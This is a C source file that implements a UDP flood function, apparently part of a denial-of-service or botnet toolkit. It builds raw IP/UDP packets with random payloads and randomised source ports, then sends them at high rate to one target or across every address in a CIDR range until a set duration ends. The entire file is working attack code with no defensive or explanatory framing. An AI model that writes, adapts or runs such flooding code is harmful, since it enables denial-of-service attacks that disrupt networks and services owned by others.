#define _GNU_SOURCE
#include "headers/attack_params.h"

void* udp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (udp_sock < 0) return NULL;

    int one = 1;
    if (setsockopt(udp_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(udp_sock);
        return NULL;
    }

    /* 8MB send buffer */
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(udp_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    const int ip_size  = (int)sizeof(struct iphdr);
    const int udp_size = (int)sizeof(struct udphdr);
    int min_pkt = ip_size + udp_size;

    int psize_min = params->len_min > 0 ? (int)params->len_min : 48;
    int psize_max = params->len_max > 0 ? (int)params->len_max : psize_min;
    if (psize_min < min_pkt) psize_min = min_pkt;
    if (psize_max < min_pkt) psize_max = min_pkt;
    if (psize_max > 1500)    psize_max = 1500;
    if (psize_max < psize_min) psize_max = psize_min;

    unsigned char packet[1500];
    memset(packet, 0, sizeof(packet));

    struct iphdr*  iph  = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + ip_size);

    /* Pre-fill payload once with random bytes */
    unsigned char *data = packet + ip_size + udp_size;
    size_t max_data = sizeof(packet) - ip_size - udp_size;
    if (params->msg_len > 0 && params->msg) {
        size_t to_copy = params->msg_len < (int)max_data ? (size_t)params->msg_len : max_data;
        memcpy(data, params->msg, to_copy);
        for (size_t i = to_copy; i < max_data; i++)
            data[i] = (unsigned char)(rand() & 0xFF);
    } else {
        for (size_t i = 0; i < max_data; i++)
            data[i] = (unsigned char)(rand() & 0xFF);
    }

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port   = params->target_addr.sin_port;
    dest_addr.sin_addr   = params->target_addr.sin_addr;

    iph->ihl      = 5;
    iph->version  = 4;
    iph->protocol = IPPROTO_UDP;
    iph->saddr    = INADDR_ANY;
    iph->daddr    = params->target_addr.sin_addr.s_addr;
    iph->ttl      = 64;
    iph->frag_off = htons(0x4000);

    udph->dest  = params->target_addr.sin_port;
    udph->check = 0;

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep  = usleep_min > 0;

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt = 0;

    if (params->cidr > 0) {
        uint32_t base  = ntohl(params->base_ip);
        uint32_t mask  = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end   = start | (~mask);

        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            int psize = (psize_min == psize_max) ? psize_min
                      : psize_min + (rand() % (psize_max - psize_min + 1));
            iph->tot_len = htons((uint16_t)psize);
            udph->source = htons(params->srcport > 0 ? params->srcport
                              : (uint16_t)(1024 + rand() % 64511));
            udph->len = htons((uint16_t)(psize - ip_size));

            if (params->cidr == 32) {
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                iph->id    = htons((uint16_t)(rand() & 0xFFFF));
                iph->tos   = 0;
                iph->check = 0;
                iph->check = generic_checksum((unsigned short*)iph, ip_size);
                sendto(udp_sock, packet, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                pkt++;
            } else if (params->cidr == 31) {
                for (int pass = 0; pass < 2; pass++) {
                    dest_addr.sin_addr.s_addr = htonl(pass == 0 ? start : end);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    iph->id    = htons((uint16_t)(rand() & 0xFFFF));
                    iph->check = 0;
                    iph->check = generic_checksum((unsigned short*)iph, ip_size);
                    sendto(udp_sock, packet, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    pkt++;
                }
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_addr.sin_addr.s_addr = htonl(ip);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    iph->id    = htons((uint16_t)(rand() & 0xFFFF));
                    iph->check = 0;
                    iph->check = generic_checksum((unsigned short*)iph, ip_size);
                    sendto(udp_sock, packet, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    pkt++;
                }
                continue;
            }

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    } else {
        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            int psize = (psize_min == psize_max) ? psize_min
                      : psize_min + (rand() % (psize_max - psize_min + 1));
            iph->tot_len = htons((uint16_t)psize);
            iph->id      = htons((uint16_t)(rand() & 0xFFFF));
            iph->tos     = 0;
            udph->source = htons(params->srcport > 0 ? params->srcport
                              : (uint16_t)(1024 + rand() % 64511));
            udph->len    = htons((uint16_t)(psize - ip_size));
            iph->check   = 0;
            iph->check   = generic_checksum((unsigned short*)iph, ip_size);
            sendto(udp_sock, packet, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                   (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            pkt++;

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    }

    close(udp_sock);
    return NULL;
}
